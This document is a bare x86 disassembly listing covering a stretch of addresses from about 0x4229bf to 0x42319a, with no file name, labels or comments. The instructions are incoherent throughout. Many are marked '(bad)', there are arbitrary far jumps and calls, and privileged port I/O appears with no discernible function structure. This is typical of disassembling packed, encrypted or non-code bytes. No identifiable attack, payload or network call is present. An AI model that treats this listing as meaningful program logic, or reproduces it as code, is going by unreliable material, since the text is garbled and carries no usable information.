  4229bf:	pop    ebp
  4229c0:	dec    ebx
  4229c1:	pop    edi
  4229c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229c3:	pop    ebx
  4229c4:	and    al,BYTE PTR [ebp+edi*2+0x1f6e282]
  4229cb:	cmp    ch,0xd3
  4229ce:	test   DWORD PTR [eax+0x39],ecx
  4229d1:	std    
  4229d2:	cmp    eax,0x6341b95f
  4229d7:	jno    0x4229ce
  4229d9:	scas   al,BYTE PTR es:[edi]
  4229da:	mov    dl,0x4a
  4229dc:	push   edi
  4229dd:	(bad)  
  4229de:	push   esp
  4229df:	push   eax
  4229e0:	cdq    
  4229e1:	mov    ds,WORD PTR [edi+0x3a7fd27d]
  4229e7:	sbb    DWORD PTR [edi+0x6f89f452],edi
  4229ed:	cmp    eax,0xaa53cecc
  4229f2:	ficomp WORD PTR [ebp+0x1a3a34e8]
  4229f8:	mov    WORD PTR [edx],ds
  4229fa:	cwde   
  4229fb:	popa   
  4229fc:	adc    eax,0xe2811568
  422a01:	aam    0xb7
  422a03:	mov    eax,ds:0x95e10c7f
  422a08:	in     eax,0x44
  422a0a:	jae    0x422a4e
  422a0c:	imul   BYTE PTR [ecx]
  422a0e:	in     eax,dx
  422a0f:	jns    0x4229da
  422a11:	clc    
  422a12:	or     dh,BYTE PTR [edi-0x6b]
  422a15:	jmp    0x4229e3
  422a17:	and    eax,0xb6524feb
  422a1c:	fidiv  DWORD PTR [edx]
  422a1e:	dec    edx
  422a1f:	ret    0x1db3
  422a22:	ret    
  422a23:	(bad)  
  422a24:	daa    
  422a25:	cmp    BYTE PTR [edx],dh
  422a27:	cwde   
  422a28:	pop    ecx
  422a29:	cmp    al,0xce
  422a2b:	xor    BYTE PTR [edi+ebx*8],ch
  422a2e:	push   es
  422a2f:	jmp    0x8c13:0x726b28f
  422a36:	jae    0x422a2e
  422a38:	or     ebp,DWORD PTR [ecx]
  422a3a:	or     DWORD PTR [ecx-0x5b],edi
  422a3d:	jle    0x422ab9
  422a3f:	(bad)  
  422a40:	mov    edi,0x545e11b1
  422a45:	aam    0x5c
  422a47:	mov    al,ds:0x920e421c
  422a4c:	dec    ebp
  422a4d:	(bad)  
  422a4e:	aad    0xce
  422a50:	push   ecx
  422a51:	pop    edi
  422a52:	dec    edi
  422a53:	xchg   ebp,eax
  422a54:	push   esp
  422a55:	cwde   
  422a56:	cmc    
  422a57:	lea    eax,[edi+esi*8]
  422a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a5b:	mov    edi,DWORD PTR [eax-0x6a1ce9a3]
  422a61:	(bad)  
  422a63:	leave  
  422a64:	jbe    0x422a2b
  422a66:	pop    ecx
  422a67:	mov    bh,0x13
  422a69:	jge    0x422ad4
  422a6b:	mov    ebx,0xa22b5932
  422a70:	sar    DWORD PTR [edi],cl
  422a72:	mov    edx,0xf6dfed74
  422a77:	sti    
  422a78:	jle    0x422a8e
  422a7a:	mov    esp,0xa75073af
  422a7f:	push   ss
  422a80:	imul   ecx,esi,0xffffffb8
  422a83:	jle    0x422a39
  422a85:	aaa    
  422a86:	retf   
  422a87:	push   ds
  422a88:	inc    esi
  422a89:	inc    edi
  422a8a:	data16 fstp st(4)
  422a8d:	in     al,dx
  422a8e:	adc    eax,0x6fd442dc
  422a93:	jl     0x422ac5
  422a95:	ins    BYTE PTR es:[edi],dx
  422a96:	push   esp
  422a97:	jae    0x422aa3
  422a99:	push   ecx
  422a9a:	mov    ebp,0x5ed7cd1
  422a9f:	and    BYTE PTR [esi+ecx*2-0x6d],dl
  422aa3:	cmp    al,0xc1
  422aa5:	mov    al,0xfe
  422aa7:	dec    edx
  422aa8:	fld    TBYTE PTR [esi-0x1df0b760]
  422aae:	cld    
  422aaf:	cld    
  422ab0:	jmp    0x4d416c73
  422ab5:	bound  esi,QWORD PTR [ecx+esi*4]
  422ab8:	in     al,dx
  422ab9:	and    eax,0x9a5ad09e
  422abe:	jmp    FWORD PTR [edi-0x74eea0e6]
  422ac4:	sub    esp,DWORD PTR [esi+0x341c2b14]
  422aca:	xchg   ecx,eax
  422acb:	or     eax,0xd0197eca
  422ad0:	sbb    eax,0xacb8c625
  422ad5:	bound  ecx,QWORD PTR [ebx]
  422ad7:	icebp  
  422ad8:	mov    ds:0x15959567,al
  422add:	or     DWORD PTR ds:0x3488c0fc,edi
  422ae3:	(bad)  
  422ae4:	mov    ebx,0x692c37b7
  422ae9:	lahf   
  422aea:	mov    eax,ds:0xfc5f0549
  422aef:	lods   al,BYTE PTR ds:[esi]
  422af0:	xor    BYTE PTR [edx+edi*8+0x31b431ed],cl
  422af7:	pop    esp
  422af8:	mov    al,ds:0xb1fd7f02
  422afd:	pop    edi
  422afe:	push   edx
  422aff:	inc    BYTE PTR [esi+eax*4+0x7b]
  422b03:	cli    
  422b04:	sbb    al,ch
  422b06:	(bad)  
  422b07:	dec    esi
  422b08:	js     0x422afc
  422b0a:	mov    ebx,0xd0184d09
  422b0f:	dec    BYTE PTR ds:0xe14eecbe
  422b15:	cmp    al,0x59
  422b17:	int3   
  422b18:	xor    ebp,DWORD PTR [ebx-0x56413d61]
  422b1e:	dec    esp
  422b1f:	add    al,0x90
  422b21:	xchg   ecx,eax
  422b22:	jbe    0x422abd
  422b24:	lds    esi,FWORD PTR [edi+0x7edb2b2c]
  422b2a:	fimul  DWORD PTR [edi+0x7d]
  422b2d:	push   edx
  422b2e:	call   0x137a18b
  422b33:	pop    ebx
  422b34:	loope  0x422abc
  422b36:	xor    al,0x5a
  422b38:	inc    edx
  422b39:	call   0x6c7e2080
  422b3e:	inc    ebp
  422b3f:	push   eax
  422b40:	sbb    edi,DWORD PTR [edx+0x32524a7d]
  422b46:	mov    ds:0x91dfd508,al
  422b4b:	or     ch,BYTE PTR [edx+ecx*4+0x1eeac739]
  422b52:	and    DWORD PTR [ebp+edx*4+0x748cac83],esi
  422b59:	xchg   eax,edx
  422b5b:	pop    esp
  422b5c:	lds    edi,FWORD PTR [edx-0x3f3793a3]
  422b62:	shl    BYTE PTR [edx],0x5e
  422b65:	out    dx,al
  422b66:	xor    dl,BYTE PTR [esi-0x29]
  422b69:	push   ss
  422b6a:	bound  esi,QWORD PTR [ebp+0xc]
  422b6d:	ins    DWORD PTR es:[edi],dx
  422b6e:	mov    ah,0x1b
  422b70:	mul    DWORD PTR [ebx]
  422b72:	push   edi
  422b73:	cmp    esp,DWORD PTR [esi]
  422b75:	cld    
  422b76:	js     0x422bb7
  422b78:	shr    BYTE PTR [ebp-0x33ce3e70],0x77
  422b7f:	stc    
  422b80:	mov    esp,0xb8c31a36
  422b85:	ins    BYTE PTR es:[edi],dx
  422b86:	cmp    al,0x78
  422b88:	mov    ds:0xad8832e4,eax
  422b8d:	cwde   
  422b8e:	cli    
  422b8f:	mov    ebp,0xc39c68ba
  422b94:	cli    
  422b95:	push   0xf
  422b97:	pop    eax
  422b98:	and    edi,DWORD PTR [ebp+0x45803ea3]
  422b9e:	leave  
  422b9f:	repnz inc edi
  422ba1:	mov    DWORD PTR ds:0xcc08e01a,esp
  422ba7:	xchg   ecx,eax
  422ba8:	int3   
  422ba9:	out    dx,eax
  422baa:	(bad)  
  422bac:	push   0x3ce708d1
  422bb1:	jle    0x422b9b
  422bb3:	daa    
  422bb4:	jecxz  0x422b89
  422bb6:	cmp    edx,DWORD PTR [edx+0x5d01da35]
  422bbc:	aad    0x9e
  422bbe:	jns    0x422b9f
  422bc0:	clc    
  422bc1:	jne    0x422c37
  422bc3:	sub    DWORD PTR [ebx],esi
  422bc5:	adc    al,0x3
  422bc7:	lahf   
  422bc8:	sub    al,0x15
  422bca:	xor    al,0x35
  422bcc:	neg    BYTE PTR [ecx-0x63]
  422bcf:	inc    edi
  422bd0:	adc    DWORD PTR [ebp-0x70d96213],0x3977a29c
  422bda:	sahf   
  422bdb:	mov    DWORD PTR ds:0xdc861ea2,0xf207e944
  422be5:	out    dx,eax
  422be6:	and    bl,al
  422be8:	inc    esi
  422be9:	nop
  422bea:	out    dx,al
  422beb:	(bad)  
  422bec:	jne    0x422c0f
  422bee:	cmp    al,0xda
  422bf0:	sub    bh,ah
  422bf2:	add    BYTE PTR [ebx-0x6f],al
  422bf5:	fcomp  QWORD PTR [eax]
  422bf7:	or     DWORD PTR [ebx+0x73fe803f],edx
  422bfd:	icebp  
  422bfe:	cmp    DWORD PTR [ecx+0x12f1ba52],edi
  422c04:	dec    edi
  422c05:	add    edx,edx
  422c07:	shl    DWORD PTR [eax],0xb8
  422c0a:	adc    bl,dh
  422c0c:	jp     0x422c60
  422c0e:	inc    esi
  422c0f:	push   edx
  422c10:	push   ebp
  422c11:	aaa    
  422c12:	mov    dl,0x43
  422c14:	sbb    al,0x9b
  422c16:	imul   esi,DWORD PTR [esi+esi*8-0x67e7e64d],0xce4e0691
  422c21:	idiv   DWORD PTR [ecx-0x80]
  422c24:	fidiv  WORD PTR [esi-0xf]
  422c27:	inc    ebp
  422c28:	(bad)  
  422c29:	cmp    cl,BYTE PTR [ecx+ecx*8-0x632de4b7]
  422c30:	(bad)  
  422c31:	fsub   DWORD PTR [ecx-0x2a407206]
  422c37:	data16 (bad) 
  422c39:	jbe    0x422c27
  422c3b:	cmp    eax,0x9755a0ad
  422c40:	addr16 mov edi,0xf9bc2eb9
  422c46:	and    al,0xd5
  422c48:	sbb    DWORD PTR [edx+0x55],esp
  422c4b:	test   DWORD PTR [edi],esp
  422c4d:	ds nop
  422c4f:	sub    edx,DWORD PTR [ecx+0x59]
  422c52:	xor    BYTE PTR [ecx-0x4c],bl
  422c55:	pop    ss
  422c56:	jno    0x422cbe
  422c58:	sbb    al,0xef
  422c5a:	dec    DWORD PTR [ecx-0x80]
  422c5d:	fisttp QWORD PTR [edx-0x71b84054]
  422c63:	pushf  
  422c64:	mov    ah,0x71
  422c66:	sbb    al,0x95
  422c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c69:	xchg   esi,edx
  422c6b:	rep outs dx,BYTE PTR ds:[esi]
  422c6d:	mov    ebx,0x1ae205c8
  422c72:	cmp    dh,BYTE PTR [edi+ebp*2-0x5f]
  422c76:	es shl ecx,cl
  422c79:	ja     0x422c81
  422c7b:	fs data16 and al,0xb2
  422c7f:	jmp    0x422c81
  422c81:	add    BYTE PTR [edi+edi*4+0x63],bl
  422c85:	push   eax
  422c86:	jecxz  0x422c64
  422c88:	jg     0x422c49
  422c8a:	popa   
  422c8b:	hlt    
  422c8c:	mov    esi,0x65c1e41d
  422c91:	mov    al,ds:0x1a0d8
  422c96:	add    eax,DWORD PTR es:[eax]
  422c99:	add    cl,bh
  422c9b:	add    ebp,DWORD PTR [eax]
  422c9d:	mov    dh,0x0
  422c9f:	inc    eax
  422ca0:	fwait
  422ca1:	std    
  422ca2:	sbb    ah,BYTE PTR [edi+eax*1]
  422ca5:	inc    eax
  422ca6:	push   edx
  422ca7:	jns    0x422c4c
  422ca9:	out    dx,al
  422caa:	cmp    DWORD PTR [edi],edx
  422cac:	cmp    DWORD PTR ss:[edx+0x2],edx
  422cb0:	outs   dx,BYTE PTR ds:[esi]
  422cb1:	jle    0x422d19
  422cb3:	out    0x10,eax
  422cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cb6:	push   es
  422cb7:	rcl    DWORD PTR [ebp+eax*1-0x66ccaecc],cl
  422cbe:	shl    BYTE PTR [edx+eiz*8],cl
  422cc1:	shl    BYTE PTR [ebx-0x57],1
  422cc4:	mov    BYTE PTR [esp+ebp*8],cl
  422cc7:	aam    0xb
  422cc9:	pop    ss
  422cca:	enter  0xce3b,0x7
  422cce:	sbb    cl,BYTE PTR [ebp-0xae3b734]
  422cd4:	in     al,dx
  422cd5:	pop    edi
  422cd6:	out    0x23,al
  422cd8:	cmp    BYTE PTR [edx+eiz*8+0x6a1d4f89],cl
  422cdf:	icebp  
  422ce0:	cli    
  422ce1:	inc    ebp
  422ce2:	jmp    0x422c98
  422ce4:	test   al,0x51
  422ce6:	adc    edx,DWORD PTR [edi]
  422ce8:	pushf  
  422ce9:	loop   0x422cc0
  422ceb:	ins    DWORD PTR es:[edi],dx
  422cec:	fcmovnbe st,st(7)
  422cee:	lods   eax,DWORD PTR ds:[esi]
  422cef:	hlt    
  422cf0:	mov    esp,0x71202baf
  422cf5:	sbb    dh,BYTE PTR [ebx]
  422cf7:	xor    al,0xbd
  422cf9:	inc    ebp
  422cfa:	mov    al,ds:0x9243d914
  422cff:	inc    eax
  422d00:	mov    cl,0xe2
  422d02:	xor    bh,BYTE PTR [ebx+0x59]
  422d05:	ret    0x11d2
  422d08:	or     al,0xe4
  422d0a:	mov    WORD PTR [edi-0x46c8ef01],es
  422d10:	fdiv   DWORD PTR [edi+ebx*1-0x4ecd7400]
  422d17:	test   DWORD PTR [edi+0x67a2497f],esi
  422d1d:	bts    ebp,edi
  422d20:	pop    edi
  422d21:	repnz inc esi
  422d23:	call   DWORD PTR [ebx-0x4b]
  422d26:	aam    0x8c
  422d28:	mov    ds,WORD PTR [edi+ebx*8]
  422d2b:	into   
  422d2c:	add    cl,ch
  422d2e:	jb     0x422d93
  422d30:	leave  
  422d31:	jle    0x422cea
  422d33:	scas   al,BYTE PTR es:[edi]
  422d34:	cs dec eax
  422d36:	mov    al,ds:0x6114e8c
  422d3b:	sbb    DWORD PTR [edx-0x6c],esp
  422d3e:	fs inc esp
  422d40:	ja     0x422d19
  422d42:	ret    
  422d43:	je     0x422d37
  422d45:	and    eax,0x88956a50
  422d4a:	and    BYTE PTR [ebp-0x15],dh
  422d4d:	(bad)  
  422d4e:	jnp    0x422d51
  422d50:	int3   
  422d51:	mov    BYTE PTR [eax+ecx*2],dl
  422d54:	mov    esi,0x7938f577
  422d59:	mov    dl,0xdd
  422d5b:	adc    BYTE PTR [ebx+edx*4-0x39a938f3],bh
  422d62:	add    DWORD PTR [ebp+0x55],0xacffc634
  422d69:	cmp    ecx,ebp
  422d6b:	scas   eax,DWORD PTR es:[edi]
  422d6c:	add    eax,0x400fe5f7
  422d71:	aad    0xcc
  422d73:	and    eax,0x55a8f5d9
  422d78:	lock ror BYTE PTR [ebp+0x1c290087],0xc9
  422d80:	leave  
  422d81:	fist   DWORD PTR [ebp-0x1]
  422d84:	mov    esi,0xcdaa4543
  422d89:	dec    ebx
  422d8a:	or     eax,0x609d44da
  422d8f:	push   es
  422d90:	mov    bh,0x85
  422d92:	sbb    eax,edi
  422d94:	ret    
  422d95:	sbb    eax,0xf2212686
  422d9a:	bound  esp,QWORD PTR [edx+0x5f4b27a5]
  422da0:	iret   
  422da1:	popf   
  422da2:	arpl   si,cx
  422da4:	js     0x422d91
  422da6:	test   eax,0xa4628c8b
  422dab:	scas   eax,DWORD PTR es:[edi]
  422dac:	sti    
  422dad:	cmp    DWORD PTR [edi+ebx*1-0x2b],eax
  422db1:	cvtps2pi mm0,xmm1
  422db4:	add    dl,BYTE PTR [ebx-0x12]
  422db7:	dec    ebp
  422db8:	shl    BYTE PTR [ebp-0x2bf60eec],cl
  422dbe:	fwait
  422dbf:	sar    BYTE PTR [edx+0x0],1
  422dc2:	loopne 0x422d9f
  422dc4:	pop    ds
  422dc5:	popa   
  422dc6:	push   esp
  422dc7:	and    eax,0x50b1db96
  422dcc:	and    ecx,DWORD PTR [edi]
  422dce:	mov    esp,0x1eda03dd
  422dd3:	mov    dl,0xe6
  422dd5:	bound  ebx,QWORD PTR [ebx]
  422dd7:	and    dh,BYTE PTR [eax+ebp*4-0x38]
  422ddb:	(bad)  
  422ddc:	aaa    
  422ddd:	pop    eax
  422dde:	xchg   edi,eax
  422ddf:	fsub   st,st(2)
  422de1:	fwait
  422de2:	mov    cs,WORD PTR [edi-0x7f9a4936]
  422de8:	ins    BYTE PTR es:[edi],dx
  422de9:	cld    
  422dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dec:	sub    eax,0xe55720da
  422df1:	imul   esp,DWORD PTR [ecx-0x1fd66b36],0x752d5703
  422dfb:	test   BYTE PTR [edx],dl
  422dfd:	out    dx,al
  422dfe:	push   cs
  422dff:	or     ebx,ebp
  422e01:	jbe    0x422e69
  422e03:	sub    ecx,0x1
  422e06:	pop    ecx
  422e07:	rcr    esi,1
  422e09:	rcl    BYTE PTR [esi],1
  422e0b:	jl     0x422e7b
  422e0d:	cmp    al,0x28
  422e0f:	push   esp
  422e10:	js     0x422e55
  422e12:	cmp    bh,BYTE PTR [esi-0x8]
  422e15:	adc    esi,ebx
  422e17:	retf   
  422e18:	pop    esi
  422e19:	nop
  422e1a:	add    eax,0x741f72ce
  422e1f:	jge    0x422e49
  422e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e22:	cdq    
  422e23:	jp     0x422dda
  422e25:	sbb    BYTE PTR [edi+0x34],dl
  422e28:	push   ebx
  422e29:	dec    esp
  422e2a:	fwait
  422e2b:	loop   0x422e46
  422e2d:	addr16 mov esp,0xf4016a44
  422e33:	in     eax,dx
  422e34:	sbb    ebp,esp
  422e36:	(bad)  [eax]
  422e38:	das    
  422e39:	add    eax,0xac5ea5f1
  422e3e:	sti    
  422e3f:	add    al,0xa6
  422e41:	into   
  422e42:	mov    esp,0x20a09978
  422e47:	jl     0x422e35
  422e49:	xchg   edx,eax
  422e4a:	xchg   BYTE PTR [eax-0x25],bh
  422e4d:	or     eax,0x34da528b
  422e52:	push   esi
  422e53:	neg    esp
  422e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e56:	xchg   ebx,eax
  422e57:	sub    BYTE PTR ds:0x198c0e19,cl
  422e5d:	mov    bh,0x1a
  422e5f:	iret   
  422e60:	mov    WORD PTR [esi+0x7],?
  422e63:	mov    ebp,0xf30e92f4
  422e68:	aam    0x48
  422e6a:	mov    ebx,DWORD PTR [eax-0x32]
  422e6d:	mov    ebx,0xa98adb09
  422e72:	mov    ds:0x423b8222,eax
  422e77:	ror    DWORD PTR [ecx],cl
  422e79:	ret    0x5415
  422e7c:	cmp    ah,BYTE PTR [edx-0x6afa4bc3]
  422e82:	dec    ebp
  422e83:	pop    esi
  422e84:	ja     0x422eac
  422e86:	jae    0x422eaf
  422e88:	mov    ds:0xa70fedd7,al
  422e8d:	in     eax,dx
  422e8e:	call   0x26e9:0xef763dca
  422e95:	jnp    0x422e1c
  422e97:	les    ebp,FWORD PTR [esi-0x15]
  422e9a:	mov    eax,ds:0xb2c4887b
  422e9f:	lds    edx,FWORD PTR [ecx-0x4c]
  422ea2:	and    BYTE PTR [edx-0x60184a89],ch
  422ea8:	sar    DWORD PTR [ebx],cl
  422eaa:	fcom   QWORD PTR [edi+0x4a34eb49]
  422eb0:	push   esp
  422eb1:	aad    0xbb
  422eb3:	rcr    esi,cl
  422eb5:	stos   BYTE PTR es:[edi],al
  422eb6:	in     eax,dx
  422eb7:	xor    BYTE PTR [ecx-0xe],cl
  422eba:	adc    BYTE PTR [ebp-0x4b],ch
  422ebd:	test   dh,dh
  422ebf:	rcr    bl,0xb4
  422ec2:	and    al,0x93
  422ec4:	mov    edi,esp
  422ec6:	retf   
  422ec7:	outs   dx,DWORD PTR ds:[esi]
  422ec8:	xchg   edi,eax
  422ec9:	jmp    0xa8ad:0xc9c7d707
  422ed0:	jo     0x422eee
  422ed2:	call   0x1508:0x1369253d
  422ed9:	dec    edx
  422eda:	cmc    
  422edb:	gs pop eax
  422edd:	(bad)  
  422ede:	pusha  
  422edf:	mov    cl,0x62
  422ee1:	adc    al,0xd2
  422ee3:	nop
  422ee4:	xor    ecx,DWORD PTR [esi-0x20697af]
  422eea:	mov    ebp,0x618c3f93
  422eef:	and    al,BYTE PTR [ecx+0x33]
  422ef2:	fs hlt 
  422ef4:	daa    
  422ef5:	and    ebx,DWORD PTR [edx-0x36]
  422ef8:	popf   
  422ef9:	dec    edi
  422efa:	pop    esi
  422efb:	xor    cl,al
  422efd:	mov    edx,DWORD PTR [eax+eiz*1+0x58aff565]
  422f04:	push   0x21
  422f06:	ins    BYTE PTR es:[edi],dx
  422f07:	sbb    DWORD PTR [esi-0x56],ebx
  422f0a:	scas   eax,DWORD PTR es:[edi]
  422f0b:	clc    
  422f0c:	addr16 icebp 
  422f0e:	mov    ds:0x4b8d77aa,eax
  422f13:	stos   DWORD PTR es:[edi],eax
  422f14:	sub    al,0x5a
  422f16:	pop    esi
  422f17:	leave  
  422f18:	adc    BYTE PTR [ecx-0x58],0xf5
  422f1c:	jo     0x422f50
  422f1e:	or     edi,edi
  422f20:	das    
  422f21:	mov    BYTE PTR [edi],al
  422f23:	jns    0x422ecd
  422f25:	push   ss
  422f26:	jae    0x422f1b
  422f28:	in     eax,0x31
  422f2a:	aam    0x21
  422f2c:	js     0x422f7d
  422f2e:	std    
  422f2f:	jl     0x422eb7
  422f31:	daa    
  422f32:	data16 aaa 
  422f34:	inc    esi
  422f35:	adc    eax,0xb4b15a20
  422f3a:	int    0x84
  422f3c:	xor    eax,0xe59d2ff6
  422f41:	adc    DWORD PTR [eax+ecx*1+0x7f265c21],ecx
  422f48:	xchg   ebp,eax
  422f49:	xchg   esi,eax
  422f4a:	jecxz  0x422f06
  422f4c:	outs   dx,DWORD PTR ds:[esi]
  422f4d:	cwde   
  422f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f4f:	sbb    BYTE PTR [ebx],bl
  422f51:	es xor al,0x43
  422f54:	pop    ds
  422f55:	push   eax
  422f56:	dec    esp
  422f57:	js     0x422fb1
  422f59:	dec    ebx
  422f5a:	add    al,0x84
  422f5c:	inc    esi
  422f5d:	(bad)  
  422f5e:	xor    al,0xf2
  422f60:	push   edi
  422f61:	sub    DWORD PTR [esi-0xda36da2],edx
  422f67:	and    DWORD PTR [edx],edi
  422f69:	xchg   edx,eax
  422f6a:	inc    edx
  422f6b:	mov    eax,ds:0x5528f8aa
  422f70:	mov    edx,0x33eb89f1
  422f75:	loopne 0x422fd8
  422f77:	enter  0x55de,0x2d
  422f7b:	je     0x422f7f
  422f7d:	popa   
  422f7e:	adc    eax,0x39425b3e
  422f83:	lahf   
  422f84:	pop    edx
  422f85:	sub    al,0x31
  422f87:	dec    edx
  422f88:	dec    ebx
  422f89:	and    al,0x2d
  422f8b:	pop    eax
  422f8c:	xchg   ecx,eax
  422f8d:	ret    
  422f8e:	icebp  
  422f8f:	mov    ah,BYTE PTR ds:0x239e6fb2
  422f95:	loope  0x422f3d
  422f97:	xor    eax,0xae8e430d
  422f9c:	ds jp  0x422f72
  422f9f:	adc    DWORD PTR [edi],0x70
  422fa2:	push   ebx
  422fa3:	jmp    0xc3f7bb38
  422fa8:	mov    bh,dh
  422faa:	dec    ecx
  422fab:	xchg   ebp,eax
  422fac:	xor    al,0x79
  422fae:	mov    bl,0x11
  422fb0:	mov    BYTE PTR [esi+0x14],dh
  422fb3:	jle    0x422fbf
  422fb5:	push   ebx
  422fb6:	mov    ds,WORD PTR [ebx]
  422fb8:	jo     0x422fa5
  422fba:	nop
  422fbb:	cmp    BYTE PTR [ebp+0x79f5a5],cl
  422fc1:	add    BYTE PTR [ebx+0x55],al
  422fc4:	pusha  
  422fc5:	(bad)  
  422fc6:	jbe    0x422f87
  422fc8:	out    dx,eax
  422fc9:	fnstsw WORD PTR [edx-0xbbca93d]
  422fcf:	mov    al,BYTE PTR [edi+0x43]
  422fd2:	(bad)  
  422fd3:	mov    ds:0x3260001,eax
  422fd8:	add    BYTE PTR [eax],al
  422fda:	jecxz  0x422feb
  422fdc:	imul   ebx,DWORD PTR [ebp-0x7f65fe58],0x1e
  422fe3:	xchg   ecx,esi
  422fe5:	sbb    BYTE PTR [esi],cl
  422fe7:	popf   
  422fe8:	inc    edi
  422fe9:	jmp    0xc79b0100
  422fee:	ret    
  422fef:	adc    bl,BYTE PTR [esi-0x42764ed3]
  422ff5:	push   edx
  422ff6:	pop    edi
  422ff7:	jo     0x423060
  422ff9:	leave  
  422ffa:	shl    dh,0xc8
  422ffd:	cmp    ch,0x85
  423000:	mov    esp,0x819c4e17
  423005:	xor    ah,BYTE PTR [ebx]
  423007:	ja     0x423051
  423009:	mov    ebp,0xd77a2bdf
  42300e:	mov    dl,0xce
  423010:	nop
  423011:	xor    edx,DWORD PTR [ebx+0x3]
  423014:	shr    edi,1
  423016:	retf   
  423017:	in     eax,dx
  423018:	jns    0x422fca
  42301a:	jo     0x423015
  42301c:	inc    eax
  42301d:	push   edi
  42301e:	pop    ebp
  42301f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423020:	or     esi,DWORD PTR [esi]
  423022:	sub    al,0x14
  423024:	test   ecx,esi
  423026:	imul   ecx,edi,0x13942c4b
  42302c:	jnp    0x42309c
  42302e:	neg    DWORD PTR [ebp-0x7560ecd2]
  423034:	sub    eax,0x51ddb5ee
  423039:	es out 0x8b,al
  42303c:	push   ss
  42303d:	or     DWORD PTR [edi],edi
  42303f:	xor    DWORD PTR [ecx+edx*2-0x30],edi
  423043:	and    bl,BYTE PTR [ecx+0x41b9d476]
  423049:	and    bh,bh
  42304b:	inc    ebx
  42304c:	fs adc dl,ah
  42304f:	xor    DWORD PTR [ebx-0x7c],ebx
  423052:	jecxz  0x42302e
  423054:	pop    ds
  423055:	inc    esp
  423056:	dec    edi
  423057:	pusha  
  423058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423059:	jnp    0x423076
  42305b:	add    eax,0x61eef17a
  423060:	(bad)  
  423061:	adc    al,0x2f
  423063:	add    BYTE PTR [esi-0x45580bfc],0x71
  42306a:	and    BYTE PTR [eax+ebx*2-0x525e72e9],dh
  423071:	add    eax,0xcfc66153
  423076:	pop    esp
  423077:	push   esp
  423078:	pop    esp
  423079:	ins    BYTE PTR es:[edi],dx
  42307a:	and    esp,DWORD PTR [edi-0x75]
  42307d:	mov    cl,0x25
  42307f:	jne    0x42307b
  423081:	dec    edx
  423082:	popa   
  423083:	mov    ah,0xfa
  423085:	jge    0x4230ce
  423087:	icebp  
  423088:	mov    cl,0x32
  42308a:	inc    esi
  42308b:	data16 add ah,0x8f
  42308f:	jl     0x423094
  423091:	lock retf 0x6e98
  423095:	mov    cs,WORD PTR ds:0xaafd2f7b
  42309b:	inc    esp
  42309c:	stos   DWORD PTR es:[edi],eax
  42309d:	dec    edi
  42309e:	sub    esi,DWORD PTR [edi+0xa32ec91]
  4230a4:	addr16 and ebp,0xffffffc0
  4230a8:	jle    0x42306b
  4230aa:	pop    ecx
  4230ab:	add    eax,0x5a15a216
  4230b0:	cld    
  4230b1:	scas   al,BYTE PTR es:[edi]
  4230b2:	jne    0x42306e
  4230b4:	sub    dh,BYTE PTR [ecx]
  4230b6:	add    eax,0x90b5d246
  4230bb:	bound  esi,QWORD PTR [edx-0x44954c32]
  4230c1:	ror    ebp,0x98
  4230c4:	mov    edx,ss
  4230c6:	push   eax
  4230c7:	cmovg  edx,DWORD PTR [ecx-0x20]
  4230cb:	stos   BYTE PTR es:[edi],al
  4230cc:	call   0x2bed:0xb5a7fef4
  4230d3:	nop
  4230d4:	jge    0x42312d
  4230d6:	cli    
  4230d7:	(bad)  
  4230d8:	xor    ch,BYTE PTR [eax-0x1594ca46]
  4230de:	ins    DWORD PTR es:[edi],dx
  4230df:	jmp    0x54413757
  4230e4:	repnz add DWORD PTR [esi-0x15],esp
  4230e8:	sub    esi,DWORD PTR [eax+0x78b906af]
  4230ee:	daa    
  4230ef:	or     DWORD PTR [eax],esi
  4230f1:	mov    esp,0x9b99a57
  4230f6:	xchg   esp,eax
  4230f7:	add    al,0x10
  4230f9:	dec    edi
  4230fa:	pop    edx
  4230fb:	add    ah,bl
  4230fd:	push   edx
  4230fe:	enter  0x6af2,0x42
  423102:	fidivr WORD PTR [ebp-0x33]
  423105:	mov    ds:0xbd56c1d1,al
  42310a:	dec    eax
  42310b:	mov    al,0xfe
  42310d:	and    eax,0xcd9cc0aa
  423112:	xor    ah,BYTE PTR [esi]
  423114:	jl     0x42312c
  423116:	fwait
  423117:	aaa    
  423118:	fst    DWORD PTR [eax]
  42311a:	fdivp  st(3),st
  42311c:	loop   0x4230e6
  42311e:	mov    edi,0x72c01156
  423123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423124:	mov    WORD PTR [edi],es
  423126:	data16 sub BYTE PTR [eax+0xe],dl
  42312a:	cld    
  42312b:	aam    0x2f
  42312d:	popf   
  42312e:	mov    cl,0xe7
  423130:	adc    bl,BYTE PTR [edx]
  423132:	int    0x61
  423134:	xchg   BYTE PTR ss:[edx+0x461a887a],dl
  42313b:	add    DWORD PTR [ebx-0x7c35166b],0x53
  423142:	inc    edi
  423143:	push   0xfffffff2
  423145:	xor    BYTE PTR [edi+edi*2-0x580ede58],dl
  42314c:	adc    eax,0xd64fc1a5
  423151:	push   ecx
  423152:	out    dx,eax
  423153:	mov    ecx,0xc7de4c21
  423158:	fldlg2 
  42315a:	sar    BYTE PTR [esi],1
  42315c:	and    BYTE PTR [ecx+0x7a02ec0b],0xb1
  423163:	pop    es
  423164:	sub    esi,DWORD PTR [esi+0x72]
  423167:	push   ecx
  423168:	cwde   
  423169:	mov    ah,0x2e
  42316b:	imul   esi,DWORD PTR [edi+edi*4+0xa3baf37],0x7dc5e3c4
  423176:	cs xchg si,ax
  423179:	jnp    0x42318f
  42317b:	or     BYTE PTR [edx*2+0x68a504e5],cl
  423182:	jg     0x4231a6
  423184:	ins    BYTE PTR es:[edi],dx
  423185:	int    0x73
  423187:	jl     0x423157
  423189:	and    eax,DWORD PTR [ebx+0x19]
  42318c:	fsubr  DWORD PTR [edi-0x216926ec]
  423192:	iret   
  423193:	cmp    al,dl
  423195:	mov    ebp,0xa5dfc83e
  42319a:	inc    eax
